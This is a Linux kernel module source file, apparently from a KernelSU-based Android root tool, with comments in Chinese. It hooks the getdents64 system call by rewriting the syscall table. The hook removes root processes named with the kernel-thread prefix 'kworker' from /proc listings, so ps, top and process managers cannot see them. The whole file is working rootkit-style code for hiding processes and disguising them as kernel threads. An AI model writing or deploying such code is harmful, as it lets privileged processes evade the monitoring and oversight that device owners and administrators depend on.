// SPDX-License-Identifier: GPL-2.0
/*
 * 进程级隐身：把「伪装名启动的 root 进程」从 /proc 目录列表里摘掉。
 *
 * 为什么必须在核层做：
 *   用户态能改 argv[0] 和 comm，但脚本按 shebang 自己 exec 出来的进程、脚本内部
 *   fork 出去的守护进程，名字是内核在 exec 时定的，用户态来不及改。只有拦截
 *   目录枚举这一层，才能让 ps / top / 进程管理器读不到这些 pid。
 *
 * 为什么只 hook getdents64 而不摘 task_struct 链表：
 *   摘链（改 task->tasks.prev/next）会让 release_task() 再摘一次同样的节点，
 *   直接踩坏内核链表；而且依赖它的调度、统计子系统都会受影响。
 *   只过滤目录项，进程本身照常运行，风险面和可控性都更好。
 *
 * 为什么直接改 syscall 表而不是走 dispatcher：
 *   dispatcher 只对「被标记的进程」生效，ps 通常是 shell(uid 2000) 在跑的，
 *   不会被标记 —— 那样过滤对 ps 完全无效。改表是全局的。
 */

#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dcache.h>
#include <linux/mount.h>
#include <linux/magic.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/stddef.h>
#include <linux/uaccess.h>
#include <linux/pid.h>
#include <linux/cred.h>
#include <linux/string.h>
#include <linux/moduleparam.h>
#include <linux/build_bug.h>
#include <linux/limits.h>
#include <linux/version.h>
#include <linux/printk.h>

#include <asm/ptrace.h>
#include <asm/unistd.h>

#include "klog.h" // IWYU pragma: keep
#include "arch.h"
#include "hook/syscall_hook.h"
#include "proc_hide.h"

#ifndef PROC_SUPER_MAGIC
#define PROC_SUPER_MAGIC 0x9fa0
#endif

#ifndef DT_UNKNOWN
#define DT_UNKNOWN 0
#endif
#ifndef DT_DIR
#define DT_DIR 4
#endif

/* mtkd 用这个名字的软链去执行 shell；userland 侧见 userspace/mtkd/src/stealth.rs */
#define KSU_STEALTH_PREFIX "kworker"

/* 单次 getdents64 返回的字节数上限：超过就不过滤（宁可这次不藏，也不要大块分配） */
#define KSU_GETDENTS_MAX (128 * 1024)

/*
 * 自带一份 dirent64 布局，不依赖内核头里的 struct linux_dirent64：
 * 该结构在部分内核版本里被搬动过，而 getdents64 的线上布局从来没变过。
 * 定长头部 19 字节：d_ino(8) + d_off(8) + d_reclen(2) + d_type(1)。
 */
struct ksu_dirent64 {
    u64 d_ino;
    s64 d_off;
    u16 d_reclen;
    u8 d_type;
    char d_name[];
} __packed;

/* __packed 之后 sizeof 就是定长 19 字节，别对柔性数组取 offsetof（老编译器行为不稳） */
#define KSU_DIRENT_HEADER sizeof(struct ksu_dirent64)

static bool ksu_stealth_hide = true;
/* 被我们替换掉的原始 getdents64；调用它才是真正的枚举 */
static syscall_fn_t ksu_orig_getdents64;

module_param_named(stealth_hide, ksu_stealth_hide, bool, 0600);
MODULE_PARM_DESC(stealth_hide, "hide kworker-named root processes from /proc listings");

static bool ksu_stealth_match(struct task_struct *task)
{
    if (!task || (task->flags & PF_KTHREAD))
        return false;
    if (strncmp(task->comm, KSU_STEALTH_PREFIX, sizeof(KSU_STEALTH_PREFIX) - 1))
        return false;
    /* 真实 uid 为 0：mtkd 起的进程都是 root。此处调用方必须持有 rcu_read_lock() */
    return __task_cred(task)->uid.val == 0;
}

static bool ksu_stealth_should_hide(int pid)
{
    struct task_struct *task;
    bool hide;

    rcu_read_lock();
    task = find_task_by_vpid(pid);
    hide = ksu_stealth_match(task);
    rcu_read_unlock();
    return hide;
}

/* 目录名是纯数字就当 pid 解析；不是则返回 -1（. 、.. 、其它条目） */
static int ksu_dirent_pid(const char *name, size_t len)
{
    int value = 0;
    size_t index;

    if (len == 0 || len > 10)
        return -1;
    for (index = 0; index < len; index++) {
        char ch = name[index];

        if (ch < '0' || ch > '9')
            return -1;
        value = value * 10 + (ch - '0');
    }
    return value;
}

/* 这个 fd 是不是开在 procfs 上的目录 */
static bool ksu_fd_is_procfs_dir(int fd)
{
    struct file *file;
    bool procfs;

    file = fget(fd);
    if (!file)
        return false;
    procfs = d_is_dir(file->f_path.dentry) && file->f_path.dentry->d_sb &&
             file->f_path.dentry->d_sb->s_magic == PROC_SUPER_MAGIC;
    fput(file);
    return procfs;
}

long __nocfi ksu_hook_getdents64(const struct pt_regs *regs)
{
    long ret, pos, kept;
    int fd, pid;
    bool broken = false;
    struct ksu_dirent64 __user *dirp;
    struct ksu_dirent64 *entry;
    u8 *buf;
    size_t name_len;

    if (!ksu_orig_getdents64)
        return -ENOSYS;

    ret = ksu_orig_getdents64(regs);
    if (ret <= 0 || !READ_ONCE(ksu_stealth_hide))
        return ret;
    /* init 自己别动，避免开机路径上出意外 */
    if (current->pid <= 1)
        return ret;
    if (ret > KSU_GETDENTS_MAX)
        return ret;

    fd = (int)PT_REGS_PARM1(regs);
    dirp = (struct ksu_dirent64 __user *)(unsigned long)PT_REGS_PARM2(regs);
    if (!dirp)
        return ret;
    if (!ksu_fd_is_procfs_dir(fd))
        return ret;

    /*
	 * 在 bounce buffer 里改，不直接写用户内存：目录项长度可变，
	 * 原地压缩需要 memmove，跨用户地址空间做太危险。
	 * ret 最大 128K，走 kvmalloc 以免高位分配失败。
	 */
    buf = kvmalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;
    if (copy_from_user(buf, dirp, ret)) {
        kvfree(buf);
        return ret;
    }

    pos = 0;
    kept = 0;
    while (pos < ret) {
        entry = (struct ksu_dirent64 *)(buf + pos);
        if ((size_t)entry->d_reclen < KSU_DIRENT_HEADER || (long)entry->d_reclen > ret - pos) {
            broken = true;
            break;
        }
        name_len = entry->d_reclen - KSU_DIRENT_HEADER;
        pid = ksu_dirent_pid(entry->d_name, strnlen(entry->d_name, name_len));

        /* 只藏目录项：/proc/<pid>/fd 里的纯数字符号链接不能被误伤 */
        if (pid > 0 && (entry->d_type == DT_DIR || entry->d_type == DT_UNKNOWN) && ksu_stealth_should_hide(pid)) {
            pos += entry->d_reclen;
            continue;
        }

        if (kept != pos)
            memmove(buf + kept, buf + pos, entry->d_reclen);
        kept += entry->d_reclen;
        pos += entry->d_reclen;
    }

    /*
	 * 结构异常时整份放弃，绝不把半截数据回写给用户。
	 * kept == 0 也放弃：回写 0 字节等于向调用方宣告「目录读完」，
	 * 会让它跳过后面还没读到的 pid（fail-open 比漏藏更能保住枚举正确性）。
	 */
    if (!broken && kept > 0 && kept < ret) {
        if (copy_to_user(dirp, buf, kept) == 0)
            ret = kept;
    }

    kvfree(buf);
    return ret;
}

void ksu_proc_hide_init(void)
{
    /* 布局错了就别挂 hook：宁可进程可见，也不能把 /proc 枚举改坏 */
    BUILD_BUG_ON(sizeof(struct ksu_dirent64) != 19);
    ksu_syscall_table_hook(__NR_getdents64, (syscall_fn_t)ksu_hook_getdents64, &ksu_orig_getdents64);
    pr_info("proc_hide: getdents64 hook %s\n", ksu_orig_getdents64 ? "installed" : "failed");
}

void ksu_proc_hide_exit(void)
{
    if (ksu_orig_getdents64)
        ksu_syscall_table_unhook(__NR_getdents64);
    ksu_orig_getdents64 = NULL;
}